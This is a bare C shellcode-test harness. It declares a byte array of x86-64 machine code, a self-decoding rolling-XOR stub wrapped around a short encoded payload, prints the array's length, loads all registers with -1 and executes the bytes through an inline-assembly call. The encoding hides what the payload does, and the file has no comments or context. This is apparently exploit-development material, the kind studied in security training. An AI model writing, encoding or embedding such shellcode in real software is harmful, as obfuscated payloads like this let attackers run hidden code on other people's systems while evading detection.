#include <stdio.h>
#include <string.h>
 

char shellcode[] = "\xeb\x23\x5f\x6a\x42\x5e\x48\x31\xc0\x48\x31\xc9\x99\x48\x83\xf9\x20\x7f\x17\x8a\x07\x40\x30\xf0\x40\x8a\x37\x88\x07\x48\xff\xc7\x48\xff\xc1\xeb\xe8\xe8\xd8\xff\xff\xff\x0a\x3b\xfb\xab\xe3\x58\x77\x15\x7c\x12\x3d\x12\x61\x09\x5a\x12\x9b\x7c\x2c\x64\xed\x0f\x58\x10\x99\x7f\x37\xb4\x74\x4f\x40\x45";

 
main(void)
{       


         printf("Shellcode length: %d\n", (int)strlen(shellcode));
          
        __asm__ (
            "mov $0xffffffffffffffff, %rax\n\t"
            "mov %rax, %rbx\n\t"
            "mov %rax, %rcx\n\t"
            "mov %rax, %rdx\n\t"
            "mov %rax, %rsi\n\t"
            "mov %rax, %rdi\n\t"
            "mov %rax, %rbp\n\t"

            "call shellcode"
        );


}
 
